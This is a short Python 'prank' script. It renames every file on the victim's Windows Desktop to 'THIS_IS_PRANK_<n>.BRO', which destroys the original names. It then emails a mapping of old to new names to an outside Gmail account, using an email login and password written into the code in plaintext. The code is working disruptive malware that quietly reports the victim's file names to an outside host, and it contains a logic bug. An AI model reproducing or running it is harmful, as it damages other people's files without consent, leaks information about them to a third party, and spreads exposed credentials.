import smtplib
import os
import re

def teleport():
    user = os.getlogin()
    path = "C://Users//" + str(user) + '//Desktop'
    
    if os.getcwd() != path:
        os.chdir(path)
        path_files = os.listdir(os.getcwd())
    else:
        pass
    
    renamer(path_files)
    
def renamer(array):
    i = 0
    while i != len(array):
        for element in array:
            os.rename(element, 'THIS_IS_PRANK_' + str(i) + '.BRO')
            i += 1
    pranks_arr = os.listdir(os.getcwd())
    
    report(array, pranks_arr)       

def report(array, array_2):
    x = 0
    file_result = []  
    
    for new_element in array_2:
        file_result.append(str(array[x]) + ' => ' + str(new_element))
        x += 1

    for line in file_result:
        try:
            messanger(line)
        except:
            messanger('File renamed success!')
            
def messanger(array_3):
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)

    msgObject.starttls()
    msgObject.login('totorenko2001@gmail.com', 'sap24052001')
    msgObject.sendmail('123@gmail.com', 'totorenko2001@gmail.com', str(array_3))
    msgObject.quit()
        
if __name__ == '__main__':
    teleport()